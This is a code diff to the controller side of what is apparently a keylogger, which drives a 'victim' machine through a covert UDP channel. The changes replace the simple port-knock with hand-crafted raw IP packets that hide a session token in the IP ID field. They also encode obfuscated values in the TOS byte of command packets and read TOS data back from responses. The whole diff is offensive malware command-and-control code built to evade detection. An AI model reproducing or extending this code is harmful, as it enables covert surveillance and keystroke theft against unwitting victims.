@@ -1,6 +1,7 @@
 #include <arpa/inet.h>
 #include <errno.h>
 #include "keylogger.h"
+#include <netinet/ip.h>
 #include <pthread.h>
 #include <stdarg.h>
 #include <stdint.h>
@@ -59,7 +60,7 @@ static int read_menu_choice(void);
 static int is_valid_ipv4(const char *ip);
 static int set_victim_ip(commander_config_t *cfg);
 static int port_knock(const char *victim_ip);
-static int send_udp_byte(int sock, const char *victim_ip, uint16_t port, uint8_t value);
+static int send_raw_knock(const char *victim_ip, uint16_t port, uint16_t ip_id);
 static void sleep_ms(long milliseconds);
 static int session_open(session_t *session, const char *victim_ip);
 static void session_close(session_t *session);
@@ -235,22 +236,19 @@ static int set_victim_ip(commander_config_t *cfg) {
 }
 
 static int port_knock(const char *victim_ip) {
-    int sock;
+    uint32_t session_token;
     int result = 0;
 
-    sock = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sock < 0) {
-        perror("socket");
-        return -1;
-    }
+    session_token = protocol_knock_session_token(SEQ_INIT);
 
     printf("Port-knocking %s on UDP ports", victim_ip);
     for (uint16_t i = 0; i < KNOCK_PORT_COUNT; i++) {
         uint16_t port = (uint16_t)(KNOCK_PORT_BASE + i);
+        uint16_t ip_id = protocol_encode_ip_id((uint8_t)i, session_token);
         printf(" %u", (unsigned)port);
         fflush(stdout);
 
-        if (send_udp_byte(sock, victim_ip, port, (uint8_t)i) != 0) {
+        if (send_raw_knock(victim_ip, port, ip_id) != 0) {
             result = -1;
             break;
         }
@@ -259,29 +257,118 @@ static int port_knock(const char *victim_ip) {
     }
 
     printf("\n");
-    close(sock);
     return result;
 }
 
-static int send_udp_byte(int sock, const char *victim_ip, uint16_t port, uint8_t value) {
-    struct sockaddr_in addr;
-    ssize_t sent;
+static uint16_t ip_checksum(const void *buf, size_t len) {
+    uint32_t sum = 0;
+    const uint16_t *p = (const uint16_t *)buf;
 
-    memset(&addr, 0, sizeof(addr));
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(port);
+    while (len > 1) {
+        sum += *p++;
+        len -= 2;
+    }
+    if (len == 1) {
+        sum += *(const uint8_t *)p;
+    }
+    while (sum >> 16) {
+        sum = (sum & 0xFFFFu) + (sum >> 16);
+    }
+    return (uint16_t)(~sum & 0xFFFFu);
+}
 
-    if (inet_pton(AF_INET, victim_ip, &addr.sin_addr) != 1) {
-        fprintf(stderr, "Invalid victim IPv4 address: %s\n", victim_ip);
+static int send_raw_knock(const char *victim_ip, uint16_t port, uint16_t ip_id) {
+    int sock;
+    struct sockaddr_in dest;
+    uint8_t packet[sizeof(struct ip) + 128];
+    struct ip *ip_data;
+    struct {
+        uint16_t src_port;
+        uint16_t dst_port;
+        uint16_t length;
+        uint16_t checksum;
+        uint8_t payload;
+    } udp_hdr;
+    struct {
+        uint32_t src;
+        uint32_t dst;
+        uint8_t zero;
+        uint8_t proto;
+        uint16_t len;
+    } pseudo;
+    int enabled;
+    size_t total_len;
+
+    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (sock < 0) {
+        int saved = errno;
+        fprintf(stderr, "Raw socket unavailable (%s); try running as root\n", strerror(saved));
         return -1;
     }
 
-    sent = sendto(sock, &value, sizeof(value), 0, (struct sockaddr *)&addr, sizeof(addr));
-    if (sent != (ssize_t)sizeof(value)) {
-        perror("sendto");
+    memset(&dest, 0, sizeof(dest));
+    dest.sin_family = AF_INET;
+    dest.sin_port = htons(port);
+    if (inet_pton(AF_INET, victim_ip, &dest.sin_addr) != 1) {
+        close(sock);
         return -1;
     }
 
+    enabled = 1;
+    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enabled, sizeof(enabled)) != 0) {
+        perror("setsockopt IP_HDRINCL");
+        close(sock);
+        return -1;
+    }
+
+    memset(packet, 0, sizeof(packet));
+    ip_data = (struct ip *)packet;
+
+    total_len = sizeof(struct ip) + sizeof(udp_hdr);
+
+    ip_data->ip_v   = 4;
+    ip_data->ip_hl  = 5;
+    ip_data->ip_tos = 0;
+    ip_data->ip_id  = htons(ip_id);
+    ip_data->ip_off = 0;
+    ip_data->ip_ttl = 64;
+    ip_data->ip_p   = IPPROTO_UDP;
+    ip_data->ip_src.s_addr = htonl(INADDR_ANY);
+    ip_data->ip_dst = dest.sin_addr;
+
+#ifdef __APPLE__
+    ip_data->ip_len = (uint16_t)total_len;
+#else
+    ip_data->ip_len = htons((uint16_t)total_len);
+#endif
+
+    ip_data->ip_sum = 0;
+    ip_data->ip_sum = ip_checksum(ip_data, sizeof(struct ip));
+
+    memset(&udp_hdr, 0, sizeof(udp_hdr));
+    udp_hdr.src_port = 0;
+    udp_hdr.dst_port = htons(port);
+    udp_hdr.length    = htons(sizeof(udp_hdr));
+    udp_hdr.checksum  = 0;
+    udp_hdr.payload   = 0;
+
+    memset(&pseudo, 0, sizeof(pseudo));
+    pseudo.src   = ip_data->ip_src.s_addr;
+    pseudo.dst   = ip_data->ip_dst.s_addr;
+    pseudo.zero  = 0;
+    pseudo.proto = IPPROTO_UDP;
+    pseudo.len   = htons(sizeof(udp_hdr));
+    {
+        uint8_t pseudo_buf[sizeof(pseudo) + sizeof(udp_hdr)];
+        memcpy(pseudo_buf, &pseudo, sizeof(pseudo));
+        memcpy(pseudo_buf + sizeof(pseudo), &udp_hdr, sizeof(udp_hdr));
+        udp_hdr.checksum = ip_checksum(pseudo_buf, sizeof(pseudo_buf));
+    }
+
+    memcpy(packet + sizeof(struct ip), &udp_hdr, sizeof(udp_hdr));
+
+    sendto(sock, packet, total_len, 0, (struct sockaddr *)&dest, sizeof(dest));
+    close(sock);
     return 0;
 }
 
@@ -297,12 +384,15 @@ static void sleep_ms(long milliseconds) {
 
 static int session_open(session_t *session, const char *victim_ip) {
     int sock;
+    int tos_opt = 1;
 
     sock = socket(AF_INET, SOCK_DGRAM, 0);
     if (sock < 0) {
         perror("socket");
         return -1;
     }
+
+    (void)setsockopt(sock, IPPROTO_IP, IP_RECVTOS, &tos_opt, sizeof(tos_opt));
 
     memset(session, 0, sizeof(*session));
     session->sock = sock;
@@ -342,6 +432,8 @@ static int session_send_packet(session_t *session, uint8_t command, const uint8_
     size_t packet_len;
     ssize_t sent;
     char error[128];
+    uint8_t tos_val;
+    uint32_t tos_key;
 
     if (!session->connected || session->sock < 0) {
         fprintf(stderr, "No active session\n");
@@ -362,6 +454,10 @@ static int session_send_packet(session_t *session, uint8_t command, const uint8_
         fprintf(stderr, "Unable to build packet: %s\n", error);
         return -1;
     }
+
+    tos_key = protocol_derive_obfuscation_key(SEQ_INIT);
+    tos_val = (uint8_t)(((tos_key >> 24) ^ command ^ (uint8_t)(session->next_seq - 1)) & 0xFC);
+    (void)setsockopt(session->sock, IPPROTO_IP, IP_TOS, &tos_val, sizeof(tos_val));
 
     sent = sendto(
         session->sock,
@@ -401,7 +497,6 @@ static int session_receive_packet(session_t *session, parsed_packet_t *parsed, u
     socklen_t src_len = sizeof(src_addr);
     fd_set read_fds;
     struct timeval timeout;
-    ssize_t received;
     char error[128];
 
     while (1) {
@@ -426,54 +521,88 @@ static int session_receive_packet(session_t *session, parsed_packet_t *parsed, u
             return -1;
         }
 
-        received = recvfrom(
-            session->sock,
-            packet,
-            packet_size,
-            0,
-            (struct sockaddr *)&src_addr,
-            &src_len
-        );
+        {
+            struct iovec iov;
+            struct msghdr msg;
+            uint8_t ctrl_buf[256];
+            struct cmsghdr *cmsg;
+            ssize_t received;
+            uint8_t received_tos = 0;
+            int tos_found = 0;
 
-        if (received < 0) {
-            if (errno == EINTR) {
+            iov.iov_base = packet;
+            iov.iov_len = packet_size;
+
+            memset(&msg, 0, sizeof(msg));
+            msg.msg_name = &src_addr;
+            msg.msg_namelen = src_len;
+            msg.msg_iov = &iov;
+            msg.msg_iovlen = 1;
+            msg.msg_control = ctrl_buf;
+            msg.msg_controllen = sizeof(ctrl_buf);
+
+            received = recvmsg(session->sock, &msg, 0);
+
+            if (received < 0) {
+                if (errno == EINTR) {
+                    continue;
+                }
+                perror("recvmsg response");
+                return -1;
+            }
+
+            for (cmsg = CMSG_FIRSTHDR(&msg); cmsg != NULL; cmsg = CMSG_NXTHDR(&msg, cmsg)) {
+#ifdef IP_RECVTOS
+                if (cmsg->cmsg_level == IPPROTO_IP && cmsg->cmsg_type == IP_RECVTOS) {
+                    if (cmsg->cmsg_len >= CMSG_LEN(sizeof(uint8_t))) {
+                        received_tos = *(uint8_t *)CMSG_DATA(cmsg);
+                        tos_found = 1;
+                    }
+                }
+#endif
+                if (cmsg->cmsg_level == IPPROTO_IP && cmsg->cmsg_type == IP_TOS) {
+                    if (cmsg->cmsg_len >= CMSG_LEN(sizeof(uint8_t))) {
+                        received_tos = *(uint8_t *)CMSG_DATA(cmsg);
+                        tos_found = 1;
+                    }
+                }
+            }
+
+            (void)received_tos;
+            (void)tos_found;
+
+            if (src_addr.sin_addr.s_addr != session->peer_addr.sin_addr.s_addr ||
+                src_addr.sin_port != htons(COVERT_PORT)) {
+                char src_ip[INET_ADDRSTRLEN];
+                inet_ntop(AF_INET, &src_addr.sin_addr, src_ip, sizeof(src_ip));
+                printf("Ignoring response from unexpected peer %s:%u\n",
+                       src_ip,
+                       (unsigned)ntohs(src_addr.sin_port));
                 continue;
             }
-            perror("recvfrom response");
-            return -1;
-        }
 
-        if (src_addr.sin_addr.s_addr != session->peer_addr.sin_addr.s_addr ||
-            src_addr.sin_port != htons(COVERT_PORT)) {
-            char src_ip[INET_ADDRSTRLEN];
-            inet_ntop(AF_INET, &src_addr.sin_addr, src_ip, sizeof(src_ip));
-            printf("Ignoring response from unexpected peer %s:%u\n",
-                   src_ip,
-                   (unsigned)ntohs(src_addr.sin_port));
-            continue;
-        }
+            if (protocol_parse_packet(packet, (size_t)received, parsed, error, sizeof(error)) != 0) {
+                fprintf(stderr, "Invalid victim response: %s\n", error);
+                return -1;
+            }
 
-        if (protocol_parse_packet(packet, (size_t)received, parsed, error, sizeof(error)) != 0) {
-            fprintf(stderr, "Invalid victim response: %s\n", error);
-            return -1;
-        }
+            if (parsed->seq_num < session->expected_response_seq) {
+                printf("Ignoring stale response sequence 0x%08x (expected 0x%08x)\n",
+                       parsed->seq_num,
+                       session->expected_response_seq);
+                continue;
+            }
 
-        if (parsed->seq_num < session->expected_response_seq) {
-            printf("Ignoring stale response sequence 0x%08x (expected 0x%08x)\n",
-                   parsed->seq_num,
-                   session->expected_response_seq);
-            continue;
-        }
+            if (parsed->seq_num != session->expected_response_seq) {
+                fprintf(stderr, "Response sequence mismatch: received 0x%08x, expected 0x%08x\n",
+                        parsed->seq_num,
+                        session->expected_response_seq);
+                return -1;
+            }
 
-        if (parsed->seq_num != session->expected_response_seq) {
-            fprintf(stderr, "Response sequence mismatch: received 0x%08x, expected 0x%08x\n",
-                    parsed->seq_num,
-                    session->expected_response_seq);
-            return -1;
+            session->expected_response_seq++;
+            return 0;
         }
-
-        session->expected_response_seq++;
-        return 0;
     }
 }
 
